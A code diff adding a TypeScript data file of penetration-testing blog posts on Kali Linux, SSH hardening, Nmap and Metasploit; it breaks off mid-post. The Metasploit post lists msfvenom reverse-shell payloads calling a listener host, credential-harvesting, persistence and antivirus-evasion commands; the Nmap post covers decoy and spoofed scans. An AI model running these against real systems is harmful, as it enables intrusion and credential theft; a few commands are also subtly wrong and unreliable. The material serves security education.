@@ -1,0 +1,2688 @@
+export interface BlogPost {
+  id: string;
+  slug: string;
+  title: string;
+  excerpt: string;
+  content: string;
+  category: string;
+  tags: string[];
+  date: string;
+  readTime: string;
+  author: string;
+}
+
+export const blogPosts: BlogPost[] = [
+  {
+    id: '1',
+    slug: 'kali-linux-penetration-testing',
+    title: 'Kali Linux: The Ultimate Penetration Testing Distribution',
+    excerpt: 'Comprehensive guide to Kali Linux, the industry-standard penetration testing distribution. Learn installation, configuration, and essential tools for ethical hacking.',
+    content: `# Kali Linux: The Ultimate Penetration Testing Distribution
+
+Kali Linux is the world\'s leading penetration testing distribution, used by security professionals, ethical hackers, and cybersecurity researchers worldwide. This powerful platform comes pre-installed with over 600 penetration testing tools.
+
+## Why Choose Kali Linux?
+
+### Pre-Installed Tools
+Kali Linux comes with a comprehensive suite of security tools:
+- **Nmap** - Network discovery and security auditing
+- **Metasploit Framework** - Exploit development and testing
+- **Burp Suite** - Web application security testing
+- **Aircrack-ng** - Wireless network security testing
+- **John the Ripper** - Password cracking
+- **Wireshark** - Network protocol analyzer
+
+### Regular Updates
+Kali receives frequent updates with the latest security tools and patches, ensuring you always have access to cutting-edge penetration testing capabilities.
+
+### Legal and Ethical
+Kali Linux is designed for legitimate security testing, penetration testing, and ethical hacking. Always ensure you have proper authorization before testing any systems.
+
+## Installation and Setup
+
+### System Requirements
+- **RAM**: 1GB minimum (2GB recommended)
+- **Storage**: 20GB minimum
+- **Processor**: x64 or ARM architecture
+
+### Installation Methods
+
+#### 1. Full Installation
+\`\`\`bash
+# Download ISO from official website
+# Create bootable USB drive using dd
+dd if=kali-linux-2023.4-vmware-amd64.7z of=/dev/sdX bs=4M
+# Boot from USB and follow installer
+\`\`\`
+
+#### 2. Virtual Machine
+Recommended for beginners:
+- Download VMware/VirtualBox images
+- Assign adequate resources
+- Take regular snapshots for testing
+
+### Initial Configuration
+
+#### Update System
+\`\`\`bash
+sudo apt update && sudo apt upgrade -y
+sudo apt dist-upgrade -y
+\`\`\`
+
+#### Install Additional Tools
+\`\`\`bash
+# Install custom tools
+sudo apt install custom-tool1 custom-tool2
+
+# Update Metasploit
+sudo msfupdate
+\`\`\`
+
+## Essential Kali Tools for Beginners
+
+### 1. Nmap (Network Scanner)
+\`\`\`bash
+# Basic port scan
+nmap target.com
+
+# Comprehensive scan
+nmap -sS -sV -O -A target.com
+
+# Scan specific ports
+nmap -p 22,80,443 target.com
+
+# Nmap Scripting Engine
+nmap --script vuln target.com
+\`\`\`
+
+### 2. Metasploit Framework
+\`\`\`bash
+# Start Metasploit
+msfconsole
+
+# Search for exploits
+search type:exploit platform:windows
+
+# Use an exploit
+use exploit/windows/smb/ms08_067_netapi
+
+# Set target
+set RHOSTS target.com
+
+# Execute
+exploit
+\`\`\`
+
+### 3. Burp Suite (Web Testing)
+- Intercept HTTP requests
+- Scan for vulnerabilities
+- Repeater for testing requests
+- Intruder for automated testing
+
+### 4. Aircrack-ng (Wireless Testing)
+\`\`\`bash
+# Put interface in monitor mode
+airmon-ng start wlan0
+
+# Capture packets
+airodump-ng wlan0mon
+
+# Crack WPA/WEP passwords
+aircrack-ng -w wordlist.cap
+\`\`\`
+
+## Legal and Ethical Considerations
+
+### Authorization Required
+- **Never test systems without explicit permission**
+- Obtain written authorization before penetration testing
+- Respect the scope and limitations agreed upon
+
+### Responsible Disclosure
+- Report vulnerabilities to system owners responsibly
+- Give reasonable time for patches before public disclosure
+- Follow coordinated vulnerability disclosure practices
+
+### Educational Use
+- Practice in controlled environments
+- Use dedicated lab networks
+- Set up personal virtual networks for learning
+
+## Advanced Configuration
+
+### Custom Repositories
+\`\`\`bash
+# Add custom tool repositories
+echo "deb [arch=amd64] http://repo.kali.org/kali kali-rolling main non-free contrib" | sudo tee -a /etc/apt/sources.list
+\`\`\`
+
+### Automation Scripts
+\`\`\`bash
+#!/bin/bash
+# Automated reconnaissance script
+nmap -sV -O target.com > nmap_results.txt
+dirb http://target.com dirb_results.txt
+\`\`\`
+
+## Troubleshooting Common Issues
+
+### Driver Issues
+Some wireless adapters require specific drivers:
+\`\`\`bash
+# Install wireless drivers
+sudo apt install firmware-iwlwifi
+# Load driver
+sudo modprobe iwlwifi
+\`\`\`
+
+### Tool Dependencies
+Missing dependencies are common:
+\`\`\`bash
+# Fix broken packages
+sudo apt --fix-broken install
+# Install missing dependencies
+sudo apt install python3-dev build-essential
+\`\`\`
+
+## Best Practices
+
+### Regular Updates
+- Update Kali weekly for latest tools
+- Keep Metasploit modules current
+- Update custom scripts and configurations
+
+### Backup Configuration
+- Export custom configurations
+- Document personal tools and settings
+- Create installation scripts for reproducibility
+
+### Security Hygiene
+- Use VPN for internet access
+- Regular security audits of your own systems
+- Keep sensitive data encrypted
+
+Kali Linux is a powerful platform that, when used ethically, can significantly enhance your cybersecurity skills and capabilities.`,
+    category: 'Penetration Testing',
+    tags: ['Kali Linux', 'Penetration Testing', 'Ethical Hacking', 'Security Tools'],
+    date: '2025-11-12',
+    readTime: '12 min read',
+    author: 'Penetration Tester'
+  },
+  {
+    id: '2',
+    slug: 'ssh-security-hardening',
+    title: 'Secure Your SSH: Essential Security Measures',
+    excerpt: 'Learn how to properly configure and secure SSH servers. Master key management, authentication methods, and hardening techniques.',
+    content: `# Secure Your SSH: Essential Security Measures
+
+SSH (Secure Shell) is one of the most critical services to secure properly. With over 2.3 million SSH servers exposed to the internet, proper configuration is essential for network security.
+
+## Why SSH Security Matters
+
+SSH provides remote access to servers and systems, making it a prime target for attackers. Common threats include:
+- Brute force attacks
+- Credential stuffing
+- Key-based attacks
+- Man-in-the-middle attacks
+
+## Essential SSH Hardening Steps
+
+### 1. Disable Password Authentication
+
+\`\`\`bash
+# Edit SSH configuration
+sudo nano /etc/ssh/sshd_config
+
+# Disable password authentication
+PasswordAuthentication no
+PubkeyAuthentication yes
+ChallengeResponseAuthentication no
+
+# Restart SSH service
+sudo systemctl restart sshd
+\`\`\`
+
+### 2. Use Strong SSH Keys
+
+\`\`\`bash
+# Generate 4096-bit RSA key
+ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_secure
+
+# Or use ed25519 (recommended)
+ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519
+
+# Add public key to server
+ssh-copy-id user@server.com
+\`\`\`
+
+### 3. Configure SSH Keys Properly
+
+\`\`\`bash
+# Create authorized_keys file with proper permissions
+mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+touch ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Add public key (one per line)
+echo "ssh-ed25519 AAAA... user@client" >> ~/.ssh/authorized_keys
+\`\`\`
+
+### 4. Restrict SSH Access
+
+\`\`\`bash
+# Limit to specific users
+AllowUsers admin security-team
+
+# Restrict by IP address
+# /etc/hosts.allow
+sshd: 192.168.1.0/24
+# /etc/hosts.deny
+sshd: ALL
+
+# Or use firewall rules
+sudo ufw allow from 192.168.1.0/24 to any port 22
+\`\`\`
+
+### 5. Change Default Port
+
+\`\`\`bash
+# Change SSH port
+Port 2222
+
+# Update firewall
+sudo ufw allow 2222/tcp
+\`\`\`
+
+## Advanced Security Configuration
+
+### Use SSH Config File
+
+\`\`\`bash
+# ~/.ssh/config
+Host server1
+    HostName server1.example.com
+    User admin
+    Port 2222
+    IdentityFile ~/.ssh/id_ed25519
+    ForwardAgent no
+    ServerAliveInterval 300
+    ServerAliveCountMax 2
+\`\`\`
+
+### Implement 2FA with Google Authenticator
+
+\`\`\`bash
+# Install google-authenticator
+sudo apt install libpam-google-authenticator
+
+# Run setup
+google-authenticator
+
+# Edit PAM configuration
+sudo nano /etc/pam.d/sshd
+# Add: auth required pam_google_authenticator.so
+
+# Update SSH config
+sudo nano /etc/ssh/sshd_config
+# Add:
+AuthenticationMethods publickey,keyboard-interactive
+ChallengeResponseAuthentication yes
+
+# Restart SSH
+sudo systemctl restart sshd
+\`\`\`
+
+### Set Up Fail2ban for SSH
+
+\`\`\`bash
+# Install Fail2ban
+sudo apt install fail2ban
+
+# Configure SSH protection
+sudo nano /etc/fail2ban/jail.local
+\`\`\`
+
+\`\`\`ini
+[DEFAULT]
+bantime = 1h
+findtime = 10m
+maxretry = 3
+
+[sshd]
+enabled = true
+port = ssh
+logpath = /var/log/auth.log
+maxretry = 3
+\`\`\`
+
+\`\`\`bash
+# Start Fail2ban
+sudo systemctl enable fail2ban
+sudo systemctl start fail2ban
+\`\`\`
+
+## Monitoring and Logging
+
+### Monitor SSH Connections
+
+\`\`\`bash
+# View current connections
+who
+w
+
+# Monitor failed login attempts
+sudo tail -f /var/log/auth.log | grep sshd
+
+# View successful logins
+last | grep sshd
+
+# Check for suspicious activity
+sudo grep "Failed password" /var/log/auth.log | tail -20
+\`\`\`
+
+### Set Up Log Monitoring
+
+\`\`\`bash
+# Create log monitoring script
+#!/bin/bash
+# monitor_ssh.sh
+grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -10
+\`\`\`
+
+## SSH Key Management
+
+### Key Rotation
+
+\`\`\`bash
+# Create new key pair
+ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_2025
+
+# Distribute new key
+ssh-copy-id -i ~/.ssh/id_ed25519_2025.pub user@server
+
+# Remove old key from server
+sed -i \'s/old-key-fingerprint//\' ~/.ssh/authorized_keys
+\`\`\`
+
+### Key Restrictions
+
+\`\`\`bash
+# Restrict key usage in authorized_keys
+# ~/.ssh/authorized_keys
+command="/usr/bin/rsync --server --daemon .",no-pty,no-agent-forwarding,no-port-forwarding,no-user-rc ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... user@client
+
+# No command execution
+from="192.168.1.0/24",no-agent-forwarding,no-pty,no-user-rc ssh-ed25519 AAAA...
+\`\`\`
+
+## Network Level Security
+
+### Use VPN for SSH Access
+
+\`\`\`bash
+# Only allow SSH through VPN
+sudo ufw delete allow 22/tcp
+sudo ufw allow from 10.0.0.0/8 to any port 22
+\`\`\`
+
+### Implement SSH Tunnels
+
+\`\`\`bash
+# Local port forwarding
+ssh -L 8080:localhost:80 user@remote-server
+
+# Dynamic port forwarding (SOCKS proxy)
+ssh -D 1080 user@remote-server
+
+# Remote port forwarding
+ssh -R 8080:localhost:80 user@local-server
+\`\`\`
+
+## Automation and Scripts
+
+### SSH Connection Script
+
+\`\`\`bash
+#!/bin/bash
+# connect.sh
+HOST=$1
+if [ -z "$HOST" ]; then
+    echo "Usage: ./connect.sh <hostname>"
+    exit 1
+fi
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $HOST
+\`\`\`
+
+### Key Deployment Script
+
+\`\`\`bash
+#!/bin/bash
+# deploy_keys.sh
+USER=$1
+HOST=$2
+if [ -z "$USER" ] || [ -z "$HOST" ]; then
+    echo "Usage: ./deploy_keys.sh <user> <host>"
+    exit 1
+fi
+
+# Generate key if it doesn\'t exist
+if [ ! -f ~/.ssh/id_ed25519 ]; then
+    ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
+fi
+
+# Deploy key
+ssh-copy-id $USER@$HOST
+
+echo "Key deployed successfully to $USER@$HOST"
+\`\`\`
+
+## Troubleshooting Common Issues
+
+### Permission Denied Errors
+
+\`\`\`bash
+# Check file permissions
+ls -la ~/.ssh/
+# Should be:
+# drwx------ (700) for .ssh directory
+# -rw------- (600) for private keys
+# -rw-r--r-- (644) for public keys
+# -rw------- (600) for authorized_keys
+
+# Fix permissions
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/id_ed25519
+chmod 644 ~/.ssh/id_ed25519.pub
+chmod 600 ~/.ssh/authorized_keys
+\`\`\`
+
+### SELinux Context Issues
+
+\`\`\`bash
+# Fix SELinux context for SSH keys
+restorecon -R -v ~/.ssh/
+\`\`\`
+
+## Security Checklist
+
+- [ ] Disable password authentication
+- [ ] Use SSH keys only
+- [ ] Implement key restrictions
+- [ ] Change default SSH port
+- [ ] Set up 2FA authentication
+- [ ] Configure Fail2ban
+- [ ] Monitor logs regularly
+- [ ] Rotate keys periodically
+- [ ] Use VPN for SSH access
+- [ ] Keep SSH version updated
+
+## Conclusion
+
+SSH security is fundamental to maintaining secure remote access. Implement these measures systematically and regularly audit your SSH configurations to ensure they remain secure against evolving threats.
+
+Remember: **Security is not a one-time setup but an ongoing process**.`,
+    category: 'Network Security',
+    tags: ['SSH', 'Network Security', 'Authentication', 'Hardening'],
+    date: '2025-11-10',
+    readTime: '15 min read',
+    author: 'Network Security Engineer'
+  },
+  {
+    id: '3',
+    slug: 'nmap-network-scanning-mastery',
+    title: 'Network Scanning with Nmap: Techniques and Best Practices',
+    excerpt: 'Master Nmap network scanning techniques. Learn port scanning, service detection, OS fingerprinting, and advanced scanning methods for security professionals.',
+    content: `# Network Scanning with Nmap: Techniques and Best Practices
+
+Nmap (Network Mapper) is the industry standard for network discovery and security auditing. Used by both security professionals and malicious actors, understanding Nmap is essential for network security.
+
+## Nmap Fundamentals
+
+### What is Nmap?
+Nmap is a free and open-source network scanner designed to:
+- Discover hosts and services on a network
+- Identify operating systems and versions
+- Detect security policies and firewalls
+- Map network topology
+
+### Key Features
+- **Port Scanning**: Identify open ports and services
+- **Service Detection**: Determine version and type of services
+- **OS Fingerprinting**: Detect operating system characteristics
+- **Script Engine**: Execute custom scripts for advanced testing
+
+## Installation and Basic Usage
+
+### Installing Nmap
+
+\`\`\`bash
+# Ubuntu/Debian
+sudo apt install nmap
+
+# CentOS/RHEL
+sudo yum install nmap
+
+# Kali Linux (pre-installed)
+nmap --version
+\`\`\`
+
+### Basic Scanning
+
+\`\`\`bash
+# Single target scan
+nmap target.com
+
+# IP address scan
+nmap 192.168.1.100
+
+# Scan multiple targets
+nmap target1.com target2.com target3.com
+
+# Scan from file
+nmap -iL targets.txt
+\`\`\`
+
+## Port Scanning Techniques
+
+### TCP Connect Scan (-sT)
+\`\`\`bash
+# Full TCP connection to each port
+nmap -sT target.com
+\`\`\`
+**Pros**: Reliable, no special privileges needed
+**Cons**: Easily detectable, slower
+
+### SYN Stealth Scan (-sS)
+\`\`\`bash
+# Half-open scan (sends SYN, analyzes response)
+nmap -sS target.com
+\`\`\`
+**Pros**: Faster, less detectable
+**Cons**: Requires root privileges
+
+### UDP Scan (-sU)
+\`\`\`bash
+# Scan UDP ports (often ignored)
+nmap -sU target.com
+
+# Combined TCP and UDP
+nmap -sS -sU target.com
+\`\`\`
+
+### ACK Scan (-sA)
+\`\`\`bash
+# Determine firewall rules
+nmap -sA target.com
+\`\`\`
+
+### NULL, FIN, Xmas Scans
+\`\`\`bash
+# NULL scan (no flags)
+nmap -sN target.com
+
+# FIN scan
+nmap -sF target.com
+
+# Xmas scan (FIN, PSH, URG flags)
+nmap -sX target.com
+\`\`\`
+
+## Service and Version Detection
+
+### Basic Service Detection (-sV)
+\`\`\`bash
+# Detect service versions
+nmap -sV target.com
+
+# Combine with aggressive timing
+nmap -sV -T4 target.com
+\`\`\`
+
+### Advanced Version Detection
+\`\`\`bash
+# Enable all version detection features
+nmap -sV --version-intensity 9 target.com
+
+# Detect operating system
+nmap -O target.com
+
+# Combine OS detection with service detection
+nmap -sV -O target.com
+\`\`\`
+
+## Timing and Performance
+
+### Timing Templates (-T0 to -T5)
+
+\`\`\`bash
+# Paranoid (T0) - slowest, stealthiest
+nmap -T0 target.com
+
+# Sneaky (T1)
+nmap -T1 target.com
+
+# Polite (T2)
+nmap -T2 target.com
+
+# Normal (T3) - default
+nmap target.com
+
+# Aggressive (T4) - faster
+nmap -T4 target.com
+
+# Insane (T5) - fastest, noisy
+nmap -T5 target.com
+\`\`\`
+
+### Custom Timing Options
+\`\`\`bash
+# Specify timing directly
+nmap --max-retries 2 --min-rate 1000 --max-rate 3000 target.com
+
+# Parallel scan settings
+nmap --min-rate 100 --max-rate 1000 target.com
+
+# Slow scan (1 request per 5 seconds)
+nmap --max-rate 0.2 target.com
+\`\`\`
+
+## Output Formats
+
+### Different Output Options
+
+\`\`\`bash
+# Normal output (default)
+nmap target.com
+
+# XML output (for scripts and reports)
+nmap -oX scan.xml target.com
+
+# Grepable output
+nmap -oG scan.txt target.com
+
+# All formats
+nmap -oA scan_results target.com
+
+# Specific formats
+nmap -oX xml_results.xml -oG grep_results.txt -oN normal_results.txt target.com
+\`\`\`
+
+### Parsing Grepable Output
+\`\`\`bash
+# Extract open ports
+grep "open" scan.txt
+
+# Find hosts that are up
+grep "Host is up" scan.txt
+
+# Count open services
+nmap -oG - target.com | grep -o '[0-9]*/open' | wc -l
+\`\`\`
+
+## Scripting Engine (NSE)
+
+### Using Nmap Scripts
+
+\`\`\`bash
+# Default safe scripts
+nmap --script default target.com
+
+# Specific script category
+nmap --script vuln target.com
+
+# Individual scripts
+nmap --script http-title,http-headers target.com
+\`\`\`
+
+### Common Script Categories
+
+#### Vulnerability Detection
+\`\`\`bash
+# Check for common vulnerabilities
+nmap --script vuln target.com
+
+# Check SSL/TLS
+nmap --script ssl-enum-ciphers -p 443 target.com
+
+# HTTP security headers
+nmap --script http-security-headers target.com
+\`\`\`
+
+#### Service Enumeration
+\`\`\`bash
+# SMB information
+nmap --script smb-info target.com
+
+# DNS information
+nmap --script dns-zone-transfer,dns-service-discovery target.com
+
+# SNMP community strings
+nmap --script snmp-info target.com
+\`\`\`
+
+#### Exploit Checking
+\`\`\`bash
+# Check for Heartbleed
+nmap --script ssl-heartbleed -p 443 target.com
+
+# SMB vulnerabilities
+nmap --script smb-vuln-* target.com
+
+# HTTP vulnerabilities
+nmap --script http-sql-injection target.com
+\`\`\`
+
+### Writing Custom Scripts
+
+\`\`\`lua
+-- Custom Nmap script example
+local http = require "http"
+local shortport = require "shortport"
+local stdnse = require "stdnse"
+
+description = [[
+Custom script to check for HTTP directory enumeration
+]]
+
+author = "Security Researcher"
+license = "MIT"
+
+rule = {
+  groups = {"default", "discovery", "safe"},
+  --- Only run on HTTP ports
+  portrule = shortport.http
+}
+
+action = function(host, port)
+  local response = http.get(host, port, "/admin")
+  
+  if response.status == 200 then
+    return stdnse.format_output(true, "Found admin directory: /admin")
+  end
+  
+  return nil
+end
+\`\`\`
+
+## Network Discovery Techniques
+
+### Host Discovery
+
+\`\`\`bash
+# Disable host discovery (only scan known hosts)
+nmap -Pn target.com
+
+# ICMP ping
+nmap -sn target.com
+
+# ARP ping (local network)
+nmap -sn --packet-trace 192.168.1.0/24
+
+# TCP SYN ping
+nmap -PS22,80,443 target.com
+
+# TCP ACK ping
+nmap -PA80 target.com
+
+# UDP ping
+nmap -PU53 target.com
+\`\`\`
+
+### Network Range Scanning
+\`\`\`bash
+# Scan entire subnet
+nmap 192.168.1.0/24
+
+# Specific range
+nmap 192.168.1.1-50
+
+# Random targets
+nmap -iR 100
+\`\`\`
+
+## Firewall Evasion Techniques
+
+### Fragmentation
+\`\`\`bash
+# Send fragmented packets
+nmap -f target.com
+\`\`\`
+
+### Decoy Scanning
+\`\`\`bash
+# Use decoy IPs to hide your real source
+nmap -D RND:10 target.com
+\`\`\`
+
+### Spoofing Source Address
+\`\`\`bash
+# Spoof source address (requires network control)
+nmap -S 1.2.3.4 target.com
+\`\`\`
+
+### Idle Scanning
+\`\`\`bash
+# Use idle host for scanning
+nmap -sI zombie.host target.com
+\`\`\`
+
+## Advanced Scanning Scenarios
+
+### Web Application Scanning
+\`\`\`bash
+# HTTP service detection
+nmap -sV --script http-headers --script http-title -p 80,443,8080,8443 target.com
+
+# Web vulnerability scanning
+nmap --script http-vuln-* -p 80,443 target.com
+
+# Directory enumeration
+nmap --script http-enum -p 80,443 target.com
+\`\`\`
+
+### Database Discovery
+\`\`\`bash
+# MySQL discovery
+nmap -sV --script mysql-info -p 3306 target.com
+
+# PostgreSQL discovery
+nmap -sV --script pgsql-info -p 5432 target.com
+
+# MongoDB discovery
+nmap -sV --script mongodb-info -p 27017 target.com
+\`\`\`
+
+### Network Service Analysis
+\`\`\`bash
+# SSH service analysis
+nmap -sV --script ssh-hostkey,ssh-auth-methods -p 22 target.com
+
+# FTP service analysis
+nmap -sV --script ftp-anon,ftp-bounce -p 21 target.com
+
+# SMTP service analysis
+nmap -sV --script smtp-commands,smtp-open-relay -p 25 target.com
+\`\`\`
+
+## Automation and Scripting
+
+### Bash Script for Network Reconnaissance
+\`\`\`bash
+#!/bin/bash
+# network_recon.sh
+
+TARGET=$1
+OUTPUT_DIR="nmap_scan_$(date +%Y%m%d_%H%M%S)"
+
+if [ -z "$TARGET" ]; then
+    echo "Usage: $0 <target>"
+    exit 1
+fi
+
+mkdir -p $OUTPUT_DIR
+
+echo "Starting reconnaissance on $TARGET"
+echo "Output directory: $OUTPUT_DIR"
+
+# Basic host discovery
+echo "Host discovery..."
+nmap -sn -oA $OUTPUT_DIR/host_discovery $TARGET
+
+# Service detection
+echo "Service detection..."
+nmap -sV -T4 -oA $OUTPUT_DIR/service_detection $TARGET
+
+# Vulnerability scanning
+echo "Vulnerability scanning..."
+nmap --script vuln -oA $OUTPUT_DIR/vulnerability_scan $TARGET
+
+echo "Scan complete. Results in $OUTPUT_DIR/"
+\`\`\`
+
+### Python Wrapper Script
+\`\`\`python
+#!/usr/bin/env python3
+import subprocess
+import json
+import sys
+
+def run_nmap_scan(target, scan_type="basic"):
+    """Run Nmap scan with Python wrapper"""
+    
+    commands = {
+        "basic": ["nmap", "-sV", "-T4", target],
+        "vuln": ["nmap", "--script", "vuln", target],
+        "full": ["nmap", "-sS", "-sV", "-O", "--script", "default", target]
+    }
+    
+    try:
+        result = subprocess.run(
+            commands.get(scan_type, commands["basic"]),
+            capture_output=True,
+            text=True,
+            timeout=300
+        )
+        
+        if result.returncode == 0:
+            print(result.stdout)
+        else:
+            print(f"Error: {result.stderr}")
+            
+    except subprocess.TimeoutExpired:
+        print("Scan timed out")
+    except Exception as e:
+        print(f"Exception occurred: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("Usage: python3 nmap_scan.py <target> [scan_type]")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    scan_type = sys.argv[2] if len(sys.argv) > 2 else "basic"
+    
+    run_nmap_scan(target, scan_type)
+\`\`\`
+
+## Best Practices and Legal Considerations
+
+### Ethical Scanning Guidelines
+
+1. **Always get authorization** before scanning systems
+2. **Document the scope** of your authorized testing
+3. **Use appropriate timing** to avoid overwhelming targets
+4. **Respect rate limits** and system resources
+5. **Report findings** responsibly to system owners
+
+### Technical Best Practices
+
+\`\`\`bash
+# Start with host discovery
+nmap -sn target.com
+
+# Use port specification for efficiency
+nmap -p 22,80,443,3306,5432 target.com
+
+# Combine multiple scan types
+nmap -sS -sV --script default target.com
+
+# Use XML output for automation
+nmap -sV -oX results.xml target.com
+\`\`\`
+
+### Performance Optimization
+
+\`\`\`bash
+# Parallel scanning
+nmap --min-rate 1000 --max-rate 3000 target.com
+
+# Reduce timeouts
+nmap --host-timeout 10s target.com
+
+# Limit ports to common ones
+nmap --top-ports 1000 target.com
+\`\`\`
+
+## Troubleshooting Common Issues
+
+### Connection Timeout Issues
+\`\`\`bash
+# Increase timeout
+nmap --host-timeout 30s target.com
+
+# Reduce retry attempts
+nmap --max-retries 2 target.com
+\`\`\`
+
+### Permission Issues
+\`\`\`bash
+# Use sudo for privileged scans
+sudo nmap -sS target.com
+
+# Check current user
+whoami
+\`\`\`
+
+### False Positives in OS Detection
+\`\`\`bash
+# Combine multiple detection methods
+nmap -sV -O --osscan-guess target.com
+\`\`\`
+
+## Conclusion
+
+Nmap is an incredibly powerful tool that, when used ethically, provides invaluable insights into network security. Master these techniques and combine them with proper authorization and documentation to conduct professional security assessments.
+
+**Remember**: With great power comes great responsibility. Always use Nmap ethically and legally.`,
+    category: 'Penetration Testing',
+    tags: ['Nmap', 'Network Scanning', 'Port Scanning', 'Security Assessment'],
+    date: '2025-11-08',
+    readTime: '18 min read',
+    author: 'Network Security Specialist'
+  },
+  {
+    id: '4',
+    slug: 'metasploit-framework-mastery',
+    title: 'Metasploit: Mastering the Metasploit Framework',
+    excerpt: 'Comprehensive guide to Metasploit Framework. Learn exploit development, payload generation, post-exploitation techniques, and professional penetration testing methodologies.',
+    content: `# Metasploit: Mastering the Metasploit Framework
+
+Metasploit Framework is the world\'s most widely used penetration testing framework, providing a comprehensive platform for developing, testing, and executing exploits.
+
+## Introduction to Metasploit
+
+### What is Metasploit?
+Metasploit Framework is an open-source security tool that provides:
+- **Exploit Development Environment**
+- **Payload Generation**
+- **Post-Exploitation Modules**
+- **Evasion Techniques**
+- **Automated Testing Capabilities**
+
+### Architecture Overview
+- **msfconsole**: Main command-line interface
+- **msfvenom**: Payload generator
+- **msfdb**: Database for storing scan results
+- **msfupdate**: Framework updater
+
+## Getting Started
+
+### Installation
+
+\`\`\`bash
+# Kali Linux (pre-installed)
+msfconsole
+
+# Ubuntu/Debian
+sudo apt install metasploit-framework
+
+# Manual installation
+git clone https://github.com/rapid7/metasploit-framework.git
+cd metasploit-framework
+bundle install
+\`\`\`
+
+### Starting Metasploit
+\`\`\`bash
+# Launch msfconsole
+msfconsole
+
+# Initialize database
+msfdb init
+
+# Update framework
+sudo msfupdate
+\`\`\`
+
+## Basic Console Usage
+
+### Getting Help
+\`\`\`bash
+# General help
+help
+
+# Command-specific help
+help show
+
+# Module information
+info exploit/windows/smb/ms08_067_netapi
+
+# Search for modules
+search type:exploit platform:windows
+\`\`\`
+
+### Console Navigation
+\`\`\`bash
+# Show available options for module
+show options
+
+# Show advanced options
+show advanced
+
+# Show targets
+show targets
+
+# Show payloads
+show payloads
+
+# Show post-exploitation modules
+show post
+\`\`\`
+
+## Exploit Development and Usage
+
+### Finding Exploits
+\`\`\`bash
+# Search by keyword
+search name:apache
+
+# Search by platform
+search platform:linux
+
+# Search by type
+search type:exploit
+
+# Combine criteria
+search type:exploit platform:windows author:jduck
+\`\`\`
+
+### Using Exploits
+\`\`\`bash
+# Select exploit
+use exploit/windows/smb/ms08_067_netapi
+
+# Set target IP
+set RHOSTS 192.168.1.100
+
+# Set target port (if different from default)
+set RPORT 445
+
+# Set payload
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+# Set listener IP
+set LHOST 192.168.1.50
+
+# Set listener port
+set LPORT 4444
+
+# Check if target is vulnerable
+check
+
+# Execute exploit
+exploit
+\`\`\`
+
+### Working with Meterpreter
+
+#### Basic Meterpreter Commands
+\`\`\`bash
+# System information
+sysinfo
+
+# Current user
+getuid
+
+# Process list
+ps
+
+# Get current directory
+pwd
+
+# List files in current directory
+ls
+
+# Change directory
+cd /path/to/directory
+
+# Download files
+download file.exe
+
+# Upload files
+upload malicious.exe
+
+# Execute commands
+execute -f cmd.exe -i
+\`\`\`
+
+#### Privilege Escalation
+\`\`\`bash
+# Check current privileges
+getprivs
+
+# Try automatic privilege escalation
+getsystem
+
+# Manual exploitation
+# (Use post-exploitation modules)
+\`\`\`
+
+#### File System Interaction
+\`\`\`bash
+# Navigate file system
+cd C:\\\\windows
+ls
+
+# Search for files
+search -f *.pdf
+
+# Edit files
+edit boot.ini
+\`\`\`
+
+## Payload Generation with msfvenom
+
+### Basic Payload Creation
+\`\`\`bash
+# Windows reverse TCP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
+
+# Linux reverse TCP
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf
+
+# Mac reverse TCP
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o payload.macho
+\`\`\`
+
+### Web Payloads
+\`\`\`bash
+# PHP reverse shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+
+# JSP reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp
+\`\`\`
+
+### Encoding Payloads
+\`\`\`bash
+# Encode with shikata_ga_nai (10 times)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe
+
+# List available encoders
+msfvenom -l encoders
+\`\`\`
+
+## Post-Exploitation Techniques
+
+### Information Gathering
+\`\`\`bash
+# System information gathering
+use post/windows/gather/checkvm
+
+use post/windows/gather/enum_logged_on_users
+
+use post/windows/gather/enum_services
+
+use post/windows/gather/enum_patches
+\`\`\`
+
+### Credential Harvesting
+\`\`\`bash
+# Hashdump (requires admin/system privileges)
+use post/windows/gather/smart_hashdump
+
+# SAM database extraction
+use post/windows/gather/credentials/sam
+
+# Browser credential extraction
+use post/windows/gather/credentials/chrome
+\`\`\`
+
+### Lateral Movement
+\`\`\`bash
+# PsExec-style execution
+use post/windows/manage/payload_inject
+
+# Scheduled task creation
+use post/windows/manage/scheduled_task
+
+# Service creation
+use post/windows/manage/payload_inject
+\`\`\`
+
+### Persistence Mechanisms
+\`\`\`bash
+# Registry persistence
+use post/windows/manage/persistence
+
+# Service persistence
+use post/windows/manage/persistence_service
+
+# Startup folder persistence
+use post/windows/manage/persistence_exe
+\`\`\`
+
+## Advanced Techniques
+
+### Evasion and Anti-Virus Bypass
+\`\`\`bash
+# Use encoders
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o bypass_payload.exe
+
+# Use AV evasion modules
+use evasion/windows/process_injection
+
+# Custom encoding
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 --encoder x86/shikata_ga_nai 5 -f exe -o custom_payload.exe
+\`\`\`
+
+### Client-Side Attacks
+\`\`\`bash
+# Browser exploitation
